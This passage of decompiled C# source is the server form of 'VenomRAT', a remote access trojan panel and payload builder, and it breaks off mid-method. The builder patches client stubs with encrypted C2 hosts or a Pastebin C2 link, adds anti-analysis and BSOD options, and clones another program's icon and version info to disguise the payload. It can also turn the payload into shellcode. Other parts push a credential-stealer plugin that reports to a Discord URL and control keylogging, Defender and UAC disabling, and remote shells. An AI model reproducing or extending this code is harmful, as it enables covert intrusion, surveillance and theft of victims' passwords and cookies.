using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.DirectoryServices;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using cGeoIp;
using DevExpress.Data.Mask;
using DevExpress.Utils;
using DevExpress.Utils.Svg;
using DevExpress.XtraBars;
using DevExpress.XtraEditors;
using DevExpress.XtraEditors.Controls;
using DevExpress.XtraGrid;
using DevExpress.XtraGrid.Columns;
using DevExpress.XtraGrid.Views.Base;
using DevExpress.XtraGrid.Views.Grid;
using DevExpress.XtraTab;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using MessagePackLib.MessagePack;
using Microsoft.VisualBasic;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Server.Algorithm;
using Server.Connection;
using Server.Handle_Packet;
using Server.Helper;
using Server.Properties;
using Stealer;
using Toolbelt.Drawing;
using Vestris.ResourceLib;

namespace Server.Forms;

public class FormMain : XtraForm
{
	public enum WebDataInfoType
	{
		PASSWORDS,
		COOKIE,
		HISTORY,
		AUTOFILL,
		BOOKMARK
	}

	private readonly Random random = new Random();

	private const string alphabet = "asdfghjklqwertyuiopmnbvcxz";

	public static List<AsyncTask> listTasks = new List<AsyncTask>();

	public cGeoMain cGeoMain = new cGeoMain();

	public static Dictionary<string, int> countryIndexes = new Dictionary<string, int>();

	public static ImageList countryImageList = new ImageList();

	public List<ClientInfo> filteredClientsInfo = new List<ClientInfo>();

	public static bool islogin = false;

	private IContainer components;

	private System.Windows.Forms.Timer ping;

	private System.Windows.Forms.Timer UpdateUI;

	private PerformanceCounter performanceCounter1;

	private PerformanceCounter performanceCounter2;

	public ImageList ThumbnailImageList;

	private System.Windows.Forms.Timer TimerTask;

	private System.Windows.Forms.Timer ConnectTimeout;

	private XtraTabControl xtraTabControl1;

	private XtraTabPage xtraTabPage1;

	private XtraTabPage xtraTabPage2;

	private XtraTabPage xtraTabPage3;

	private XtraTabPage xtraTabPage4;

	private XtraTabPage xtraTabPage5;

	public ListView listViewScreen;

	private SplitContainer splitContainer2;

	private TableLayoutPanel tableLayoutPanel1;

	private SplitContainer splitContainer3;

	private Panel panel1;

	private Label label1;

	private XtraTabPage xtraTabPage6;

	private XtraScrollableControl xtraScrollableControl1;

	private GroupControl groupControl1;

	private CheckEdit chkPaste_bin;

	private SimpleButton btnAddIP;

	private TextEdit textIP;

	private SimpleButton btnRemoveIP;

	private GroupControl groupControl2;

	private SpinEdit textPort;

	private SimpleButton btnAddPort;

	private SimpleButton btnRemovePort;

	private GroupControl groupControl3;

	private CheckEdit chkIcon;

	private Label label8;

	private CheckEdit btnAssembly;

	private Label label7;

	private Label label9;

	public SimpleButton btnIcon;

	private Label label10;

	private Label label11;

	private Label label12;

	public SimpleButton btnClone;

	private Label label13;

	private Label label14;

	private PictureBox picIcon;

	private GroupControl groupControl4;

	private Label label17;

	private CheckEdit chkAntiProcess;

	private Label label2;

	private CheckEdit chkAnti;

	public SimpleButton btnShellcode;

	public SimpleButton btnBuild;

	private Label label5;

	private CheckEdit chkBsod;

	private CheckEdit checkBox1;

	private Label label6;

	private Label label16;

	private DirectoryEntry directoryEntry1;

	private ToolTip toolTip1;

	private CheckEdit chkAll;

	private XtraTabControl xtraTabControl2;

	private XtraTabPage xtraTabPage7;

	private XtraTabPage xtraTabPage8;

	private XtraTabPage xtraTabPage9;

	private XtraTabPage xtraTabPage10;

	private XtraTabPage xtraTabPage11;

	private PopupMenu popupMenuClient;

	private BarButtonItem initallpluginmenu;

	private BarSubItem barSubItem1;

	private BarButtonItem groupbydefaultmenu;

	private BarButtonItem groupByLocationMenu;

	private BarButtonItem GroupByOSMenu;

	private BarButtonItem GroupbyAntivirusMenu;

	private BarButtonItem GroupByNoteMenu;

	private BarSubItem barSubItem2;

	private BarSubItem barSubItem3;

	private BarSubItem barSubItem4;

	private BarSubItem barSubItem5;

	private BarSubItem barSubItem6;

	private BarSubItem barSubItem7;

	private BarSubItem barSubItem8;

	private BarButtonItem AddNoteMenu;

	private BarButtonItem GotoSettingMenu;

	private BarManager barManager1;

	private BarDockControl barDockControlTop;

	private BarDockControl barDockControlBottom;

	private BarDockControl barDockControlLeft;

	private BarDockControl barDockControlRight;

	private BarButtonItem barButtonItem7;

	private BarButtonItem RemoteShellMenu;

	private BarButtonItem RemoteDesktopMenu;

	private BarButtonItem RemoteCameraMenu;

	private BarButtonItem RegEditMenu;

	private BarButtonItem FileManagerMenu;

	private BarButtonItem ProcManagerMenu;

	private BarButtonItem NetstatMenu;

	private BarButtonItem RecordMenu;

	private BarSubItem barSubItem9;

	private BarButtonItem DisableWDMenu;

	private BarButtonItem DisableRecoveryMenu;

	private BarButtonItem DisableUACMenu;

	private BarButtonItem CleanUpMenu;

	private BarButtonItem FodHelperMenu;

	private BarButtonItem RunAsMenu;

	private BarButtonItem CompLauncherMenu;

	private BarButtonItem RunShellCodeMenu;

	private BarButtonItem SendMessageBoxMenu;

	private BarButtonItem VisitWebSiteMenu;

	private BarButtonItem ChangeBackMenu;

	private BarButtonItem KeyLogMenu;

	private BarButtonItem FileSearcherMenu;

	private BarButtonItem ReverseProxyMenu;

	private BarButtonItem FunMenu;

	private BarButtonItem ShutDownMenu;

	private BarButtonItem RestartSystemMenu;

	private BarButtonItem LogoutSystemMenu;

	private BarButtonItem LoadGeneralInfoMenu;

	private BarButtonItem LoadRecoveryInfoMenu;

	private BarButtonItem LoadAnalyzedInfoMenu;

	private BarButtonItem LoadKeyLogInfoMenu;

	private BarSubItem barSubItem10;

	private BarButtonItem StopStubMenu;

	private BarButtonItem RestartStubMenu;

	private BarButtonItem NoSystemStubMenu;

	private BarButtonItem UpdateStubMenu;

	private BarButtonItem UninstallStubMenu;

	private BarButtonItem SchTaskInstallStubMenu;

	private BarButtonItem SchTaskUnInstallStubMenu;

	private BarButtonItem NormalInstallStubMenu;

	private BarButtonItem NormalUnInstallStubMenu;

	private BarButtonItem ClientFolderMenu;

	private BarButtonItem SendFileFromUrlMenu;

	private BarButtonItem SendFileToDiskMenu;

	private BarButtonItem SendFileToMemoryMenu;

	private PopupMenu popupMenuRecovery;

	private BarButtonItem SaveAllPassword;

	private BarButtonItem SaveAllCookies;

	private BarButtonItem SaveAllHistory;

	private BarButtonItem SaveAllAutoFill;

	private BarButtonItem SaveAllBookmarks;

	private BarButtonItem RefreshRecoveryMenu;

	private PopupMenu popupMenuTask;

	private BarButtonItem Task_SendFileFromUrl;

	private BarButtonItem TaskSendFileTODiskMenu;

	private BarButtonItem TaskSendFileToMemoryMenu;

	private BarButtonItem TaskDisableUACMenu;

	private BarButtonItem TaskDisableWDMenu;

	private BarButtonItem TaskInstallSchTaskMenu;

	private BarButtonItem TaskUpdateAllMenu;

	private BarButtonItem TaskAutoKeyloggerMenu;

	private BarButtonItem TaskFakeBinderMenu;

	private BarButtonItem TaskDeleteMenu;

	private BarButtonItem TaskLoadStealDataMenu;

	private BarButtonItem TaskLoadRecoveryDataMenu;

	private PopupMenu popupMenuScreen;

	private BarButtonItem StartScreenMenu;

	private BarButtonItem StopScreenMenu;

	private BarButtonItem ClearLogMenu;

	private PopupMenu popupMenuLog;

	private BarButtonItem SelectAllMenu;

	private Panel panel2;

	private Label toolStripLabelPasswordCount;

	private TextEdit txtPasswordSearch;

	private TextEdit txtIcon;

	private TextEdit txtPaste_bin;

	private TextEdit txtProduct;

	private TextEdit txtCopyright;

	private TextEdit txtTrademarks;

	private TextEdit txtCompany;

	private TextEdit txtDescription;

	private TextEdit txtOriginalFilename;

	private TextEdit txtProductVersion;

	private TextEdit txtFileVersion;

	private TextEdit txtMutex;

	private TextEdit textFilename;

	private TextEdit txtGroup;

	private SpinEdit numDelay;

	private ComboBoxEdit comboBoxFolder;

	private ListBoxControl listBoxIP;

	private ListBoxControl listBoxPort;

	private ListBoxControl listViewGrabClients;

	private ListBoxControl listViewRecoveryClients;

	private BarButtonItem OpenHvncMenu;

	public GridControl gridControlLog;

	private GridView gridViewLog;

	private GridColumn TimeColumn;

	private GridColumn MsgColumn;

	public GridControl gridControlClient;

	private GridView gridViewClient;

	private GridColumn IPColumn;

	private GridColumn HWIDColumn;

	private GridColumn PingColumn;

	private GridColumn ActiveWinColumn;

	private GridColumn NoteColumn;

	private GridColumn GroupColumn;

	private GridColumn UserNameColumn;

	private GridColumn CPUCOlumn;

	private GridColumn RAMColumn;

	private GridColumn GPUColumn;

	private GridColumn CameraColumn;

	private GridColumn OSColumn;

	private GridColumn AVColumn;

	private GridControl gridControlGraber;

	private GridView gridViewGraber;

	private GridColumn GraberCategoryColumn;

	private GridColumn GraberValueColumn;

	private GridControl gridControlRecoveryPassword;

	private GridView gridViewRecoveryPassword;

	private GridColumn RecoveryNameColumn;

	private GridColumn RecoveryPasswordColumn;

	private GridColumn RecoveryUrlColumn;

	private GridColumn RecoveryTargetColumn;

	private GridControl gridControlTask;

	private GridView gridViewTask;

	private GridColumn TaskNameColumn;

	private GridColumn TaskRunTimesColumn;

	private GridControl gridControlCookie;

	private GridView gridViewCookie;

	private GridColumn CookieNameColumn;

	private GridColumn CookieValueColum;

	private GridColumn CookieDomainColumn;

	private GridColumn CookieExpColumn;

	private GridControl gridControlHistory;

	private GridView gridViewHistory;

	private GridColumn HistoryUrlColumn;

	private GridColumn HistoryTitleColumn;

	private GridControl gridControlBookmarks;

	private GridView gridViewBookmarks;

	private GridColumn BmUrlColumn;

	private GridColumn BmTitleColumn;

	private GridControl gridControlAutofill;

	private GridView gridViewAutofill;

	private GridColumn AutoFillNameColumn;

	private GridColumn AutofillValueColumn;

	private GridColumn CountryColumn;

	private GridColumn InstallTimeColumn;

	private GridColumn PermissionColumn;

	private SplitContainer splitContainer4;

	private Panel panel3;

	private TextEdit textEditSearch;

	private GridColumn DesktopColumn;

	private BarButtonItem CopyIpMenu;

	private PanelControl panelControl1;

	private LabelControl toolStripLabel1;

	private XtraTabPage xtraTabPage12;

	private BarSubItem barSubItem11;

	private BarSubItem barSubItem12;

	private BarButtonItem TaskOfflineKeylogMenu;

	private PanelControl panelControl2;

	private XtraTabControl xtraTabControl3;

	private XtraTabPage xtraTabPage13;

	private BarButtonItem TimerKeyLogStartMenu;

	private BarButtonItem TimerKeyLogStopMenu;

	private BarButtonItem TimerKeyLogSettingMenu;

	private BarButtonItem TaskTimerKeylogMenu;

	private RadioGroup radioGroupArchitecture;

	private Label label3;

	private Label label4;

	public string SelectedRecoveryIP
	{
		get
		{
			try
			{
				return (string)listViewRecoveryClients.SelectedValue;
			}
			catch
			{
			}
			return string.Empty;
		}
	}

	public Clients SelectedClient
	{
		get
		{
			try
			{
				int[] selectedRows = gridViewClient.GetSelectedRows();
				if (selectedRows.Length == 0)
				{
					return null;
				}
				int rowHandle = selectedRows[0];
				string hwid = (string)gridViewClient.GetRowCellValue(rowHandle, HWIDColumn);
				return Settings.connectedClients.FirstOrDefault((Clients x) => x.info.hwid == hwid);
			}
			catch
			{
			}
			return null;
		}
	}

	public List<Clients> SelectedClients
	{
		get
		{
			try
			{
				int[] selectedRows = gridViewClient.GetSelectedRows();
				List<Clients> list = new List<Clients>();
				int[] array = selectedRows;
				foreach (int rowHandle in array)
				{
					string hwid = (string)gridViewClient.GetRowCellValue(rowHandle, HWIDColumn);
					Clients clients = Settings.connectedClients.FirstOrDefault((Clients x) => x.info.hwid == hwid);
					if (clients != null)
					{
						list.Add(clients);
					}
				}
				return list;
			}
			catch
			{
			}
			return new List<Clients>();
		}
	}

	private void SaveSettings()
	{
		try
		{
			List<string> list = new List<string>();
			foreach (string item3 in listBoxPort.Items)
			{
				list.Add(item3);
			}
			Server.Properties.Settings.Default.Ports = string.Join(",", list);
			List<string> list2 = new List<string>();
			foreach (string item4 in listBoxIP.Items)
			{
				list2.Add(item4);
			}
			Server.Properties.Settings.Default.IP = string.Join(",", list2);
			Server.Properties.Settings.Default.Save();
		}
		catch
		{
		}
	}

	private void LoadBuilder()
	{
		comboBoxFolder.SelectedIndex = 0;
		if (Server.Properties.Settings.Default.IP.Length == 0)
		{
			listBoxIP.Items.Add("127.0.0.1");
		}
		if (Server.Properties.Settings.Default.Paste_bin.Length == 0)
		{
			txtPaste_bin.Text = "https://pastebin.com/raw/LwwcrLg4";
		}
		try
		{
			string[] array = Server.Properties.Settings.Default.Ports.Split(new string[1] { "," }, StringSplitOptions.None);
			foreach (string text in array)
			{
				if (!string.IsNullOrWhiteSpace(text))
				{
					listBoxPort.Items.Add(text.Trim());
				}
			}
		}
		catch
		{
		}
		try
		{
			string[] array = Server.Properties.Settings.Default.IP.Split(new string[1] { "," }, StringSplitOptions.None);
			foreach (string text2 in array)
			{
				if (!string.IsNullOrWhiteSpace(text2))
				{
					listBoxIP.Items.Add(text2.Trim());
				}
			}
		}
		catch
		{
		}
		if (Server.Properties.Settings.Default.Mutex.Length == 0)
		{
			txtMutex.Text = getRandomCharacters();
		}
	}

	private void BtnRemovePort_Click(object sender, EventArgs e)
	{
		if (listBoxPort.SelectedItems.Count == 1)
		{
			listBoxPort.Items.Remove(listBoxPort.SelectedItem);
		}
	}

	private void BtnAddPort_Click(object sender, EventArgs e)
	{
		try
		{
			Convert.ToInt32(textPort.Text.Trim());
			foreach (string item in listBoxPort.Items)
			{
				if (item.Equals(textPort.Text.Trim()))
				{
					return;
				}
			}
			listBoxPort.Items.Add(textPort.Text.Trim());
		}
		catch
		{
		}
	}

	private void BtnRemoveIP_Click(object sender, EventArgs e)
	{
		if (listBoxIP.SelectedItems.Count == 1)
		{
			listBoxIP.Items.Remove(listBoxIP.SelectedItem);
		}
	}

	private void BtnAddIP_Click(object sender, EventArgs e)
	{
		try
		{
			foreach (string item in listBoxIP.Items)
			{
				textIP.Text = textIP.Text.Replace(" ", "");
				if (item.Equals(textIP.Text))
				{
					return;
				}
			}
			listBoxIP.Items.Add(textIP.Text.Replace(" ", ""));
		}
		catch
		{
		}
	}

	private void BtnBuild_Click(object sender, EventArgs e)
	{
		if ((!chkPaste_bin.Checked && listBoxIP.Items.Count == 0) || listBoxPort.Items.Count == 0)
		{
			return;
		}
		if (checkBox1.Checked)
		{
			if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text))
			{
				return;
			}
			if (!textFilename.Text.EndsWith("exe"))
			{
				textFilename.Text += ".exe";
			}
		}
		if (string.IsNullOrWhiteSpace(txtMutex.Text))
		{
			txtMutex.Text = getRandomCharacters();
		}
		if (chkPaste_bin.Checked && string.IsNullOrWhiteSpace(txtPaste_bin.Text))
		{
			return;
		}
		ModuleDefMD moduleDefMD = null;
		try
		{
			string text = "";
			if (radioGroupArchitecture.SelectedIndex == 0)
			{
				text = "ClientAny.exe";
			}
			if (radioGroupArchitecture.SelectedIndex == 1)
			{
				text = "Clientx86.exe";
			}
			if (radioGroupArchitecture.SelectedIndex == 2)
			{
				text = "Clientx64.exe";
			}
			if (string.IsNullOrEmpty(text))
			{
				MessageBox.Show("Please select architecture!");
				return;
			}
			using (moduleDefMD = ModuleDefMD.Load("Stub/" + text))
			{
				using SaveFileDialog saveFileDialog = new SaveFileDialog();
				saveFileDialog.Filter = ".exe (*.exe)|*.exe";
				saveFileDialog.InitialDirectory = Application.StartupPath;
				saveFileDialog.OverwritePrompt = false;
				saveFileDialog.FileName = "Client";
				if (saveFileDialog.ShowDialog() == DialogResult.OK)
				{
					WriteSettings(moduleDefMD, saveFileDialog.FileName);
					moduleDefMD.Write(saveFileDialog.FileName);
					moduleDefMD.Dispose();
					if (btnAssembly.Checked)
					{
						WriteAssembly(saveFileDialog.FileName);
					}
					if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
					{
						IconInjector.InjectIcon(saveFileDialog.FileName, txtIcon.Text);
					}
					MessageBox.Show("Build Successfully!!!", "Venom Builder", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					SaveSettings();
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "Venom Builder", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			moduleDefMD?.Dispose();
			btnBuild.Enabled = true;
		}
	}

	private void WriteAssembly(string filename)
	{
		try
		{
			VersionResource versionResource = new VersionResource();
			versionResource.LoadFrom(filename);
			versionResource.FileVersion = txtFileVersion.Text;
			versionResource.ProductVersion = txtProductVersion.Text;
			versionResource.Language = 0;
			StringFileInfo obj = (StringFileInfo)versionResource["StringFileInfo"];
			obj["ProductName"] = txtProduct.Text;
			obj["FileDescription"] = txtDescription.Text;
			obj["CompanyName"] = txtCompany.Text;
			obj["LegalCopyright"] = txtCopyright.Text;
			obj["LegalTrademarks"] = txtTrademarks.Text;
			obj["Assembly Version"] = versionResource.ProductVersion;
			obj["InternalName"] = txtOriginalFilename.Text;
			obj["OriginalFilename"] = txtOriginalFilename.Text;
			obj["ProductVersion"] = versionResource.ProductVersion;
			obj["FileVersion"] = versionResource.FileVersion;
			versionResource.SaveTo(filename);
		}
		catch (Exception ex)
		{
			throw new ArgumentException("Assembly: " + ex.Message);
		}
	}

	private void BtnAssembly_CheckedChanged(object sender, EventArgs e)
	{
		if (btnAssembly.Checked)
		{
			btnClone.Enabled = true;
			txtProduct.Enabled = true;
			txtDescription.Enabled = true;
			txtCompany.Enabled = true;
			txtCopyright.Enabled = true;
			txtTrademarks.Enabled = true;
			txtOriginalFilename.Enabled = true;
			txtOriginalFilename.Enabled = true;
			txtProductVersion.Enabled = true;
			txtFileVersion.Enabled = true;
		}
		else
		{
			btnClone.Enabled = false;
			txtProduct.Enabled = false;
			txtDescription.Enabled = false;
			txtCompany.Enabled = false;
			txtCopyright.Enabled = false;
			txtTrademarks.Enabled = false;
			txtOriginalFilename.Enabled = false;
			txtOriginalFilename.Enabled = false;
			txtProductVersion.Enabled = false;
			txtFileVersion.Enabled = false;
		}
	}

	private void ChkIcon_CheckedChanged(object sender, EventArgs e)
	{
		if (chkIcon.Checked)
		{
			txtIcon.Enabled = true;
			btnIcon.Enabled = true;
		}
		else
		{
			txtIcon.Enabled = false;
			btnIcon.Enabled = false;
		}
	}

	private void BtnIcon_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Title = "Choose Icon";
		openFileDialog.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
		openFileDialog.Multiselect = false;
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			if (openFileDialog.FileName.ToLower().EndsWith(".exe"))
			{
				string imageLocation = GetIcon(openFileDialog.FileName);
				txtIcon.Text = imageLocation;
				picIcon.ImageLocation = imageLocation;
			}
			else
			{
				txtIcon.Text = openFileDialog.FileName;
				picIcon.ImageLocation = openFileDialog.FileName;
			}
		}
	}

	private string GetIcon(string path)
	{
		try
		{
			string text = Path.GetTempFileName() + ".ico";
			using (FileStream stream = new FileStream(text, FileMode.Create))
			{
				IconExtractor.Extract1stIconTo(path, stream);
			}
			return text;
		}
		catch
		{
		}
		return "";
	}

	private void WriteSettings(ModuleDefMD asmDef, string AsmName)
	{
		try
		{
			string randomString = Methods.GetRandomString(32);
			Aes256 aes = new Aes256(randomString);
			X509Certificate2 x509Certificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
			X509Certificate2 x509Certificate2 = new X509Certificate2(x509Certificate.Export(X509ContentType.Cert));
			byte[] inArray;
			using (RSACryptoServiceProvider rSACryptoServiceProvider = (RSACryptoServiceProvider)x509Certificate.PrivateKey)
			{
				byte[] rgbHash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(randomString));
				inArray = rSACryptoServiceProvider.SignHash(rgbHash, CryptoConfig.MapNameToOID("SHA256"));
			}
			foreach (TypeDef type in asmDef.Types)
			{
				asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
				asmDef.Name = Path.GetFileName(AsmName);
				if (!(type.Name == "Settings"))
				{
					continue;
				}
				foreach (MethodDef method in type.Methods)
				{
					if (method.Body == null)
					{
						continue;
					}
					for (int i = 0; i < method.Body.Instructions.Count(); i++)
					{
						if (method.Body.Instructions[i].OpCode != OpCodes.Ldstr)
						{
							continue;
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Ports%")
						{
							if (chkPaste_bin.Enabled && chkPaste_bin.Checked)
							{
								method.Body.Instructions[i].Operand = aes.Encrypt("null");
							}
							else
							{
								List<string> list = new List<string>();
								foreach (string item3 in listBoxPort.Items)
								{
									list.Add(item3);
								}
								method.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", list));
							}
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Hosts%")
						{
							if (chkPaste_bin.Enabled && chkPaste_bin.Checked)
							{
								method.Body.Instructions[i].Operand = aes.Encrypt("null");
							}
							else
							{
								List<string> list2 = new List<string>();
								foreach (string item4 in listBoxIP.Items)
								{
									list2.Add(item4);
								}
								method.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", list2));
							}
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Install%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(checkBox1.Checked.ToString().ToLower());
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Folder%")
						{
							method.Body.Instructions[i].Operand = comboBoxFolder.Text;
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%File%")
						{
							method.Body.Instructions[i].Operand = textFilename.Text;
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Version%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(Settings.Version.Replace("VenomRAT ", ""));
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Key%")
						{
							method.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(randomString));
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%MTX%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(txtMutex.Text);
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Anti%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(chkAnti.Checked.ToString().ToLower());
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%AntiProcess%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(chkAntiProcess.Checked.ToString().ToLower());
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Certificate%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(x509Certificate2.Export(X509ContentType.Cert)));
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Serversignature%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(inArray));
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%BSOD%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(chkBsod.Checked.ToString().ToLower());
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Paste_bin%")
						{
							if (chkPaste_bin.Checked)
							{
								method.Body.Instructions[i].Operand = aes.Encrypt(txtPaste_bin.Text);
							}
							else
							{
								method.Body.Instructions[i].Operand = aes.Encrypt("null");
							}
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Delay%")
						{
							method.Body.Instructions[i].Operand = numDelay.Value.ToString();
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Group%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(txtGroup.Text);
						}
					}
				}
			}
		}
		catch (Exception ex)
		{
			throw new ArgumentException("WriteSettings: " + ex.Message);
		}
	}

	public string getRandomCharacters()
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 1; i <= new Random().Next(10, 20); i++)
		{
			int index = random.Next(0, "asdfghjklqwertyuiopmnbvcxz".Length);
			stringBuilder.Append("asdfghjklqwertyuiopmnbvcxz"[index]);
		}
		return stringBuilder.ToString();
	}

	private void btnClone_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "Executable (*.exe)|*.exe";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);
			txtOriginalFilename.Text = versionInfo.InternalName ?? string.Empty;
			txtDescription.Text = versionInfo.FileDescription ?? string.Empty;
			txtCompany.Text = versionInfo.CompanyName ?? string.Empty;
			txtProduct.Text = versionInfo.ProductName ?? string.Empty;
			txtCopyright.Text = versionInfo.LegalCopyright ?? string.Empty;
			txtTrademarks.Text = versionInfo.LegalTrademarks ?? string.Empty;
			_ = versionInfo.FileMajorPart;
			txtFileVersion.Text = versionInfo.FileMajorPart + "." + versionInfo.FileMinorPart + "." + versionInfo.FileBuildPart + "." + versionInfo.FilePrivatePart;
			txtProductVersion.Text = versionInfo.FileMajorPart + "." + versionInfo.FileMinorPart + "." + versionInfo.FileBuildPart + "." + versionInfo.FilePrivatePart;
		}
	}

	private void btnShellcode_Click(object sender, EventArgs e)
	{
		if ((!chkPaste_bin.Checked && listBoxIP.Items.Count == 0) || listBoxPort.Items.Count == 0)
		{
			return;
		}
		if (checkBox1.Checked)
		{
			if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text))
			{
				return;
			}
			if (!textFilename.Text.EndsWith("exe"))
			{
				textFilename.Text += ".exe";
			}
		}
		if (string.IsNullOrWhiteSpace(txtMutex.Text))
		{
			txtMutex.Text = getRandomCharacters();
		}
		if (chkPaste_bin.Checked && string.IsNullOrWhiteSpace(txtPaste_bin.Text))
		{
			return;
		}
		ModuleDefMD moduleDefMD = null;
		try
		{
			using (moduleDefMD = ModuleDefMD.Load("Stub/ClientAny.exe"))
			{
				string text = Path.Combine(Application.StartupPath, "Stub\\tempClient.exe");
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				File.Copy(Path.Combine(Application.StartupPath, "Stub\\ClientAny.exe"), text);
				WriteSettings(moduleDefMD, text);
				moduleDefMD.Write(text);
				moduleDefMD.Dispose();
				if (btnAssembly.Checked)
				{
					WriteAssembly(text);
				}
				if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
				{
					IconInjector.InjectIcon(text, txtIcon.Text);
				}
				string text2 = "";
				using (SaveFileDialog saveFileDialog = new SaveFileDialog())
				{
					saveFileDialog.Filter = ".bin (*.bin)|*.bin";
					saveFileDialog.InitialDirectory = Application.StartupPath;
					saveFileDialog.OverwritePrompt = false;
					saveFileDialog.FileName = "Client";
					if (saveFileDialog.ShowDialog() == DialogResult.OK)
					{
						text2 = saveFileDialog.FileName;
					}
				}
				string text3 = Path.Combine(Application.StartupPath, "Plugins\\donut.exe");
				if (!File.Exists(text3))
				{
					File.WriteAllBytes(text3, Resources.donut);
				}
				Process process = new Process();
				process.StartInfo.FileName = text3;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.Arguments = "-f " + text + " -o " + text2;
				process.Start();
				process.WaitForExit();
				process.Close();
				if (File.Exists(text2))
				{
					File.WriteAllText(text2 + "loader.cs", Resources.ShellcodeLoader.Replace("%venom%", Convert.ToBase64String(File.ReadAllBytes(text2))));
					File.WriteAllText(text2 + ".b64", Convert.ToBase64String(File.ReadAllBytes(text2)));
				}
				File.Delete(text);
				File.Delete(text3);
				MessageBox.Show("Build Successfully!!!", "Venom Builder", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				SaveSettings();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "Venom Builder", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			moduleDefMD?.Dispose();
			btnBuild.Enabled = true;
		}
	}

	private void LoadGrabData()
	{
		string[] directories = Directory.GetDirectories(Path.Combine(Application.StartupPath, "ClientsFolder"));
		foreach (string path in directories)
		{
			Path.GetFileName(path);
			if ((from x in Directory.GetFileSystemEntries(path)
				where Path.GetFileName(x) == "VenomStealer"
				select x).Count() > 0)
			{
				AddGrabClient(Path.GetFileName(path));
			}
		}
	}

	private void Init()
	{
		listViewGrabClients.Items.Clear();
	}

	private void stealToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			Init();
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "report";
			msgPack.ForcePathObject("discordurl").AsString = Server.Properties.Settings.Default.DiscordUrl;
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Stealer.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients connectedClient in Settings.connectedClients)
			{
				ThreadPool.QueueUserWorkItem(connectedClient.Send, msgPack2.Encode2Bytes());
			}
			new HandleLogs().Addmsg("Fetching data...(May take long time.)", Color.Black);
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	public void AddGrabClient(string ip)
	{
		if (listViewGrabClients.FindItem(ip) < 0)
		{
			listViewGrabClients.Items.Add(ip);
		}
	}

	private void listGrabViewClients_DoubleClick(object sender, EventArgs e)
	{
		if (listViewGrabClients.SelectedItems.Count != 0)
		{
			string text = (string)listViewGrabClients.SelectedItem;
			string arguments = "ClientsFolder\\" + text + "\\VenomStealer";
			Process.Start("explorer.exe", arguments);
		}
	}

	private void LoadJson(string json)
	{
		try
		{
			List<GrabItem> list = new List<GrabItem>();
			JObject jObject = JObject.Parse(json);
			foreach (KeyValuePair<string, JToken> item in jObject)
			{
				JObject jObject2 = (JObject)jObject[item.Key];
				if (jObject2 == null || jObject2.Type != JTokenType.Object)
				{
					continue;
				}
				foreach (KeyValuePair<string, JToken> item2 in jObject2)
				{
					string key = item2.Key;
